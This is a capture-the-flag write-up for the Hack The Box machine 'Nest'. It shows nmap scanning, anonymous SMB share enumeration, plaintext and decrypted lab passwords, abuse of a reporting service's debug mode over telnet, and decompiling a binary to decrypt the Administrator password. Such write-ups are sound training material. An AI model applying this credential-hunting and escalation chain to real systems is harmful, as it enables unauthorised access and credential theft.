# Nest

**Date:** 30/09/2024

## Enumeration

I performed a full port scan on the target:

```bash
nmap -p- $(cat target) -v -oN full_scan
```

**Open Ports:**
```
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
4386/tcp open  unknown
```

After a detailed scan, I found additional information about the services:

```
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
```

### SMB Service (Port 445)

I enumerated the SMB shares without authentication:

```bash
smbclient -L=$(cat target) -N
```

**Shares Found:**
```
Sharename       Type      Comment
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
Data            Disk      
IPC$            IPC       Remote IPC
Secure$         Disk      
Users           Disk      
```

I could access the `Data`, `Secure$` and `Users` shares without a password. Inside the `Users` share, I found multiple user directories:

```
Administrator, C.Smith, L.Frost, R.Thompson, TempUser
```

In the `\\HTB-NEST\Data\Shared\Templates\HR\` folder, I discovered the following TempUser credentials:

```
Username: TempUser
Password: welcome2019
```

### SMB Exploration (TempUser Credentials)

Using the TempUser credentials, against the `Data` share, I gained more access and found an encrypted password in the `IT\Configs\RU Scanner\` directory:

```xml
<Username>c.smith</Username>
<Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
```

In the `IT\Configs\NotepadPlusPlus\config.xml` file I also found an interesting share file:

```xml
<History nbMaxFile="15" inSubMenu="no" customLength="-1">
    <File filename="C:\windows\System32\drivers\etc\hosts" />
    <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
    <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
</History>
```

I look throw the `\\HTB-NEST\Secure$\IT\Carl\` folder and I located a VB project in `\IT\Carl\VB Projects\WIP\RU\`. After downloading and analyzing it, I decrypted C.Smith's password: `xRxRxPANCAK3SxRxRx`.

![Screenshot 2024-10-02 154620](https://github.com/user-attachments/assets/572e3e9e-4994-49b8-a61b-0e2c11b87aef)


### Privilege Escalation (C.Smith Credentials)

With C.Smith's credentials, I accessed his user folder and found the `user.txt` flag. I also discovered the `HQK_Config_Backup.xml` file, which indicated that the Reporting Service on port 4386 was related to LDAP.

Using `allinfo` on the file `Debug Mode Password.txt`, I uncovered an Alternate Data Stream (ADS) that contained the password: `WBQ201953D8w`.

### Exploiting HQK Reporting Service (Port 4386)

I connected via Telnet to port 4386:

```bash
telnet $(cat target) 4386
```

Using the `DEBUG` command and the password from the ADS, I enabled debug mode. I explored the directories and found the Administrator's encrypted password:

```
└─# telnet $(cat target) 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>DEBUG WBQ201953D8w                                                         

Debug mode enabled. Use the HELP command to view additional commands that are now available
>LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>SETDIR ..

Current directory set to HQK
>LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>SETDIR LDAP

Current directory set to LDAP
>LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
>SHOWQUERY 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

I try to decrypt the password with RUScanner, but it gave me a Padding error. Looking better over C.Smith folder, there were also an executable, I download it:

```
smb: \C.Smith\HQK Reporting\AD Integration Module\> ls
  .                                   D        0  Fri Aug  9 08:18:42 2019
  ..                                  D        0  Fri Aug  9 08:18:42 2019
  HqkLdap.exe                         A    17408  Wed Aug  7 19:41:16 2019

		5242623 blocks of size 4096. 1839800 blocks available
```

I decompile the executable with iLSpy and I found out other parameters:

![Screenshot 2024-10-03 070300](https://github.com/user-attachments/assets/09824152-9456-4e75-ae61-50687598c855)

After modifying the RUScanner code to adjust the decryption padding, I successfully decrypted the Administrator password: `XtH4nkS4Pl4y1nGX`.

![Screenshot 2024-10-03 070410](https://github.com/user-attachments/assets/47063e3e-5d7b-4c6a-9287-d35db8e1710f)


With this, I accessed the system as Administrator and retrieved the root flag.

---
